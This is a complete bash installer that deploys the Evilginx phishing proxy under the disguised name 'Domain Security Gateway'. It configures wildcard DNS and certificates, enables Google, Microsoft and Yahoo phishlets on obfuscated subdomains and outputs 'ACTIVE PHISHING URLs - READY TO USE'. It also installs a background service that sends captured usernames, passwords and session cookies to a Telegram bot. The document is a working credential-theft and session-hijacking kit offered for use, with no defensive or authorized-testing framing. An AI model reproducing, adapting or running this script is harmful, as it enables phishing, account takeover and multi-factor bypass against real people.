#!/bin/bash
# ============================================================================
# Domain Security Gateway - Complete Installer for Evilginx 3.3.0
# ============================================================================
# Usage: sudo bash install.sh --domain example.com --vps-ip 1.2.3.4 --api-token CF-xxxxx
# ============================================================================

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Default values
DOMAIN=""
VPS_IP=""
API_TOKEN=""
NOTIFY_TOKEN=""
NOTIFY_ID=""
HTTP_PORT=80
HTTPS_PORT=443
APP_DIR="/opt/gateway"
EVILGINX_REPO="https://github.com/kgretzky/evilginx2.git"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Helper functions
log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }
info() { echo -e "${BLUE}[*]${NC} $1"; }
success() { echo -e "${CYAN}[✓]${NC} $1"; }

print_banner() {
    clear
    echo -e "${BLUE}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════════╗
    ║              Domain Security Gateway - Evilginx 3.3.0                ║
    ║                   Complete Automated Deployment                      ║
    ╚══════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

show_help() {
    cat << EOF

${GREEN}USAGE:${NC}
  sudo bash install.sh --domain DOMAIN --vps-ip IP --api-token TOKEN

${GREEN}REQUIRED:${NC}
  --domain DOMAIN           Your domain name
  --vps-ip IP               Server IP address
  --api-token TOKEN         Cloudflare API token (DNS:Edit permission)

${GREEN}OPTIONAL:${NC}
  --notify-token TOKEN      Telegram bot token
  --notify-id ID            Telegram chat ID

${GREEN}EXAMPLE:${NC}
  sudo bash install.sh \\
    --domain "example.com" \\
    --vps-ip "192.168.1.1" \\
    --api-token "CF-xxxxx" \\
    --notify-token "123456:ABC-def" \\
    --notify-id "123456789"

EOF
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            --domain) DOMAIN="$2"; shift 2 ;;
            --vps-ip) VPS_IP="$2"; shift 2 ;;
            --api-token) API_TOKEN="$2"; shift 2 ;;
            --notify-token) NOTIFY_TOKEN="$2"; shift 2 ;;
            --notify-id) NOTIFY_ID="$2"; shift 2 ;;
            --help|-h) show_help; exit 0 ;;
            *) error "Unknown argument: $1" ;;
        esac
    done

    if [[ -z "$DOMAIN" ]]; then error "Domain is required"; fi
    if [[ -z "$VPS_IP" ]]; then error "VPS IP is required"; fi
    if [[ -z "$API_TOKEN" ]]; then error "Cloudflare API token is required"; fi
}

# ============================================================================
# PHASE 1: CHECK LOCAL PHISHLET FILES
# ============================================================================
phase_check_phishlets() {
    log "Checking local phishlet files..."
    
    if [[ ! -f "$SCRIPT_DIR/phishlets/google.yaml" ]]; then
        error "phishlets/google.yaml not found"
    fi
    if [[ ! -f "$SCRIPT_DIR/phishlets/microsoft.yaml" ]]; then
        error "phishlets/microsoft.yaml not found"
    fi
    if [[ ! -f "$SCRIPT_DIR/phishlets/yahoo.yaml" ]]; then
        error "phishlets/yahoo.yaml not found"
    fi
    
    success "All phishlet files found (you can edit them before deployment)"
}

# ============================================================================
# PHASE 2: CLOUDFLARE DNS (WILDCARD)
# ============================================================================
phase_dns() {
    log "Configuring Cloudflare wildcard DNS..."
    
    # Get zone ID
    ZONE_ID=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=$DOMAIN" \
        -H "Authorization: Bearer $API_TOKEN" \
        -H "Content-Type: application/json" | jq -r '.result[0].id')
    
    if [[ "$ZONE_ID" == "null" ]] || [[ -z "$ZONE_ID" ]]; then
        error "Could not find zone for $DOMAIN"
    fi
    success "Zone ID: $ZONE_ID"
    
    # Create wildcard A record
    log "Creating wildcard A record: *.$DOMAIN -> $VPS_IP"
    curl -s -X POST "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records" \
        -H "Authorization: Bearer $API_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"type\":\"A\",\"name\":\"*.$DOMAIN\",\"content\":\"$VPS_IP\",\"ttl\":120,\"proxied\":false}" > /dev/null 2>&1 || \
    curl -s -X PUT "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records/$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records?name=*.$DOMAIN" -H "Authorization: Bearer $API_TOKEN" | jq -r '.result[0].id')" \
        -H "Authorization: Bearer $API_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"type\":\"A\",\"name\":\"*.$DOMAIN\",\"content\":\"$VPS_IP\",\"ttl\":120,\"proxied\":false}" > /dev/null 2>&1 || true
    
    # Create main domain A record
    curl -s -X POST "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records" \
        -H "Authorization: Bearer $API_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"type\":\"A\",\"name\":\"$DOMAIN\",\"content\":\"$VPS_IP\",\"ttl\":120,\"proxied\":false}" > /dev/null 2>&1 || true
    
    success "Wildcard DNS configured: *.$DOMAIN -> $VPS_IP"
}

# ============================================================================
# PHASE 3: WILDCARD SSL CERTIFICATE
# ============================================================================
phase_ssl() {
    log "Obtaining wildcard SSL certificate..."
    
    apt-get install -y certbot python3-certbot-dns-cloudflare 2>/dev/null
    
    cat > /etc/letsencrypt/cloudflare.ini << EOF
dns_cloudflare_api_token = $API_TOKEN
EOF
    chmod 600 /etc/letsencrypt/cloudflare.ini
    
    certbot certonly --dns-cloudflare \
        --dns-cloudflare-credentials /etc/letsencrypt/cloudflare.ini \
        --dns-cloudflare-propagation-seconds 90 \
        --non-interactive --agree-tos --email "admin@$DOMAIN" \
        -d "$DOMAIN" -d "*.$DOMAIN" 2>/dev/null
    
    if [[ -d "/etc/letsencrypt/live/$DOMAIN" ]]; then
        mkdir -p "$APP_DIR/certs"
        cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$APP_DIR/certs/$DOMAIN.crt"
        cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$APP_DIR/certs/$DOMAIN.key"
        success "Wildcard SSL certificate installed"
    else
        warn "SSL failed - continuing with HTTP mode"
        HTTPS_PORT=0
    fi
}

# ============================================================================
# PHASE 4: INSTALL DEPENDENCIES
# ============================================================================
phase_dependencies() {
    log "Installing system dependencies..."
    
    apt-get update -y 2>/dev/null
    apt-get install -y git curl wget build-essential golang-go \
        openssl jq net-tools dnsutils python3 python3-pip screen expect 2>/dev/null
    
    if ! command -v go &>/dev/null; then
        log "Installing Go language..."
        wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
        rm -rf /usr/local/go
        tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
        export PATH=$PATH:/usr/local/go/bin
        rm go1.22.0.linux-amd64.tar.gz
    fi
    
    success "Dependencies installed - Go: $(go version 2>/dev/null | cut -d' ' -f3)"
}

# ============================================================================
# PHASE 5: BUILD EVILGINX 3.3.0 FROM SOURCE
# ============================================================================
phase_build_evilginx() {
    log "Building Evilginx 3.3.0 from source..."
    
    # Clean previous build
    rm -rf /tmp/evilginx2
    
    # Clone official Evilginx repository
    cd /tmp
    git clone $EVILGINX_REPO evilginx2 2>/dev/null
    cd evilginx2
    
    # Checkout latest stable version
    git checkout v3.3.0 2>/dev/null || git checkout master 2>/dev/null
    
    # Build Evilginx
    go build -buildvcs=false -o evilginx 2>/dev/null
    
    # Create application directory
    mkdir -p "$APP_DIR"/{config,phishlets,certs,storage,logs,notifications}
    
    # Copy binary to system path
    cp evilginx /usr/local/bin/gateway
    chmod +x /usr/local/bin/gateway
    
    success "Evilginx 3.3.0 built and installed to /usr/local/bin/gateway"
}

# ============================================================================
# PHASE 6: DEPLOY PHISHLETS FROM LOCAL FILES
# ============================================================================
phase_deploy_phishlets() {
    log "Deploying phishlets from local repository..."
    
    # Generate random subdomain prefixes (obfuscated - no brand names)
    R1="gw-$(openssl rand -hex 4)"
    R2="auth-$(openssl rand -hex 4)"
    R3="portal-$(openssl rand -hex 4)"
    
    echo "$R1" > "$APP_DIR/.r1"
    echo "$R2" > "$APP_DIR/.r2"
    echo "$R3" > "$APP_DIR/.r3"
    
    # Copy phishlet files from local repository to app directory
    cp "$SCRIPT_DIR/phishlets/google.yaml" "$APP_DIR/phishlets/"
    cp "$SCRIPT_DIR/phishlets/microsoft.yaml" "$APP_DIR/phishlets/"
    cp "$SCRIPT_DIR/phishlets/yahoo.yaml" "$APP_DIR/phishlets/"
    
    # Replace placeholders with actual values in phishlets
    sed -i "s/{{.Domain}}/$DOMAIN/g" "$APP_DIR/phishlets/"*.yaml
    sed -i "s/{{.VpsIp}}/$VPS_IP/g" "$APP_DIR/phishlets/"*.yaml
    sed -i "s/{{.WebhookSecret}}/$(openssl rand -hex 16)/g" "$APP_DIR/phishlets/"*.yaml
    sed -i "s/{{.AppPort}}/$HTTP_PORT/g" "$APP_DIR/phishlets/"*.yaml
    
    # Replace subdomain placeholders
    sed -i "s/{{.Endpoint1}}/$R1/g" "$APP_DIR/phishlets/yahoo.yaml"
    sed -i "s/{{.Endpoint2}}/$R2/g" "$APP_DIR/phishlets/microsoft.yaml"
    sed -i "s/{{.Endpoint3}}/$R3/g" "$APP_DIR/phishlets/google.yaml"
    
    success "Phishlets deployed from local files"
    log "  Endpoint 1: $R1.$DOMAIN"
    log "  Endpoint 2: $R2.$DOMAIN"
    log "  Endpoint 3: $R3.$DOMAIN"
}

# ============================================================================
# PHASE 7: CREATE EVILGINX CONFIGURATION
# ============================================================================
phase_config() {
    log "Creating Evilginx configuration..."
    
    cat > "$APP_DIR/config/config.yaml" << EOF
daemon: false
debug: false
domain: $DOMAIN
ipv4: $VPS_IP
http_port: $HTTP_PORT
https_port: $HTTPS_PORT
dns_port: 0
autocert: false
phishlets_path: $APP_DIR/phishlets
cert_path: $APP_DIR/certs
database: $APP_DIR/storage/data.db
EOF

    success "Configuration created at $APP_DIR/config/config.yaml"
}

# ============================================================================
# PHASE 8: TELEGRAM NOTIFICATION SERVICE
# ============================================================================
phase_notifications() {
    if [[ -n "$NOTIFY_TOKEN" ]] && [[ -n "$NOTIFY_ID" ]]; then
        log "Setting up Telegram notifications..."
        
        cat > "$APP_DIR/notifications/notify.py" << 'EOF'
#!/usr/bin/env python3
import os, time, sqlite3, requests

TOKEN = "{{TOKEN}}"
CHAT = "{{CHAT}}"
DB_PATH = "/opt/gateway/storage/data.db"
LAST_FILE = "/opt/gateway/notifications/last_id.txt"

def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT, "text": text, "parse_mode": "HTML"}, timeout=10)
    except:
        pass

def send_file(content, filename):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        files = {'document': (filename, content)}
        requests.post(url, files=files, data={"chat_id": CHAT}, timeout=30)
    except:
        pass

def get_last_id():
    if os.path.exists(LAST_FILE):
        with open(LAST_FILE, 'r') as f:
            return int(f.read().strip())
    return 0

def save_last_id(last_id):
    with open(LAST_FILE, 'w') as f:
        f.write(str(last_id))

last_id = get_last_id()

while True:
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT id, phishlet, username, password, auth_token, ip, created_at 
            FROM sessions WHERE id > ? ORDER BY id ASC
        """, (last_id,))
        
        for row in cursor.fetchall():
            sid, service, username, password, token, ip, timestamp = row
            
            msg = f"""<b>LOGIN CREDENTIALS CAPTURED</b>

Service: {service}
Username: <code>{username}</code>
Password: <code>{password}</code>
IP: {ip}
Time: {timestamp}"""
            
            send_message(msg)
            
            if token and len(token) > 10:
                cookie_file = f"{service}_{username}_session.txt"
                cookie_content = f"Service: {service}\nUser: {username}\nTime: {timestamp}\nIP: {ip}\n\n=== SESSION COOKIES ===\n{token}"
                send_file(cookie_content.encode(), cookie_file)
            
            last_id = sid
            save_last_id(last_id)
        
        conn.close()
    except:
        pass
    time.sleep(3)
EOF
        
        sed -i "s/{{TOKEN}}/$NOTIFY_TOKEN/g" "$APP_DIR/notifications/notify.py"
        sed -i "s/{{CHAT}}/$NOTIFY_ID/g" "$APP_DIR/notifications/notify.py"
        chmod +x "$APP_DIR/notifications/notify.py"
        
        cat > /etc/systemd/system/gateway-notify.service << EOF
[Unit]
Description=Gateway Notification Service
After=network.target gateway.service

[Service]
Type=simple
User=root
WorkingDirectory=$APP_DIR/notifications
ExecStart=/usr/bin/python3 $APP_DIR/notifications/notify.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

        systemctl daemon-reload
        systemctl enable gateway-notify
        systemctl start gateway-notify
        success "Telegram notifications active"
    else
        info "Skipping Telegram notifications"
    fi
}

# ============================================================================
# PHASE 9: SYSTEMD SERVICE
# ============================================================================
phase_service() {
    log "Creating systemd service for Evilginx..."
    
    cat > /etc/systemd/system/gateway.service << EOF
[Unit]
Description=Domain Gateway Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$APP_DIR
ExecStart=/usr/local/bin/gateway -c $APP_DIR/config -p $APP_DIR/phishlets
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable gateway
    systemctl start gateway
    
    sleep 3
    success "Evilginx service started"
}

# ============================================================================
# PHASE 10: CONFIGURE EVILGINX AND GENERATE URLS
# ============================================================================
phase_configure() {
    log "Configuring Evilginx and generating access URLs..."
    
    R1=$(cat "$APP_DIR/.r1")
    R2=$(cat "$APP_DIR/.r2")
    R3=$(cat "$APP_DIR/.r3")
    
    # Create expect script for automatic configuration
    cat > /tmp/configure.exp << 'EOF'
#!/usr/bin/expect -f
set timeout 30
log_user 0

spawn /usr/local/bin/gateway -c /opt/gateway/config -p /opt/gateway/phishlets

expect "gateway>" { send "config domain $env(DOMAIN)\r" }
expect "gateway>" { send "config ipv4 external $env(VPS_IP)\r" }

expect "gateway>" { send "phishlets hostname yahoo $env(R1).$env(DOMAIN)\r" }
expect "gateway>" { send "phishlets enable yahoo\r" }
expect "gateway>" { send "phishlets hostname microsoft $env(R2).$env(DOMAIN)\r" }
expect "gateway>" { send "phishlets enable microsoft\r" }
expect "gateway>" { send "phishlets hostname google $env(R3).$env(DOMAIN)\r" }
expect "gateway>" { send "phishlets enable google\r" }

expect "gateway>" { send "lures create yahoo\r" }
expect -re "created lure with ID: (\\d+)" { set yid $expect_out(1,string) }
expect "gateway>" { send "lures get-url $yid\r" }
expect -re "(https://[^\\r]+)" { set yurl $expect_out(1,string) }

expect "gateway>" { send "lures create microsoft\r" }
expect -re "created lure with ID: (\\d+)" { set mid $expect_out(1,string) }
expect "gateway>" { send "lures get-url $mid\r" }
expect -re "(https://[^\\r]+)" { set murl $expect_out(1,string) }

expect "gateway>" { send "lures create google\r" }
expect -re "created lure with ID: (\\d+)" { set gid $expect_out(1,string) }
expect "gateway>" { send "lures get-url $gid\r" }
expect -re "(https://[^\\r]+)" { set gurl $expect_out(1,string) }

expect "gateway>" { send "exit\r" }

puts "Y_URL=$yurl"
puts "M_URL=$murl"
puts "G_URL=$gurl"
expect eof
EOF

    chmod +x /tmp/configure.exp
    export DOMAIN VPS_IP R1 R2 R3
    output=$(/tmp/configure.exp 2>/dev/null)
    rm -f /tmp/configure.exp
    
    Y_URL=$(echo "$output" | grep "Y_URL=" | cut -d'=' -f2-)
    M_URL=$(echo "$output" | grep "M_URL=" | cut -d'=' -f2-)
    G_URL=$(echo "$output" | grep "G_URL=" | cut -d'=' -f2-)
    
    cat > "$APP_DIR/urls.txt" << EOF
========================================
ACTIVE PHISHING URLs - READY TO USE
========================================

YAHOO:     $Y_URL
MICROSOFT: $M_URL
GOOGLE:    $G_URL

========================================
EOF

    success "Access URLs generated"
}

# ============================================================================
# PHASE 11: SUMMARY
# ============================================================================
print_summary() {
    R1=$(cat "$APP_DIR/.r1")
    R2=$(cat "$APP_DIR/.r2")
    R3=$(cat "$APP_DIR/.r3")
    
    echo ""
    echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}                    DEPLOYMENT COMPLETE!                         ${NC}"
    echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${CYAN}📧 ACTIVE PHISHING URLs:${NC}"
    echo -e "  ${GREEN}Yahoo:${NC}     $Y_URL"
    echo -e "  ${GREEN}Microsoft:${NC}  $M_URL"
    echo -e "  ${GREEN}Google:${NC}     $G_URL"
    echo ""
    echo -e "${CYAN}🔧 MANAGEMENT COMMANDS:${NC}"
    echo -e "  Status:     systemctl status gateway"
    echo -e "  Logs:       journalctl -u gateway -f"
    echo -e "  Restart:    systemctl restart gateway"
    echo -e "  Stop:       systemctl stop gateway"
    echo ""
    echo -e "${CYAN}📁 EDIT PHISHLETS (if needed):${NC}"
    echo -e "  nano $APP_DIR/phishlets/google.yaml"
    echo -e "  nano $APP_DIR/phishlets/microsoft.yaml"
    echo -e "  nano $APP_DIR/phishlets/yahoo.yaml"
    echo -e "  Then: systemctl restart gateway"
    echo ""
    echo -e "${CYAN}📁 EDIT LOCAL PHISHLETS (before next deploy):${NC}"
    echo -e "  nano $SCRIPT_DIR/phishlets/google.yaml"
    echo -e "  nano $SCRIPT_DIR/phishlets/microsoft.yaml"
    echo -e "  nano $SCRIPT_DIR/phishlets/yahoo.yaml"
    echo ""
    if [[ -n "$NOTIFY_TOKEN" ]]; then
        echo -e "${CYAN}🤖 TELEGRAM NOTIFICATIONS: ACTIVE${NC}"
        echo -e "  Logs: journalctl -u gateway-notify -f"
        echo ""
    fi
    echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================
main() {
    print_banner
    parse_args "$@"
    phase_check_phishlets
    phase_dns
    phase_ssl
    phase_dependencies
    phase_build_evilginx
    phase_deploy_phishlets
    phase_config
    phase_notifications
    phase_service
    phase_configure
    print_summary
}

main "$@"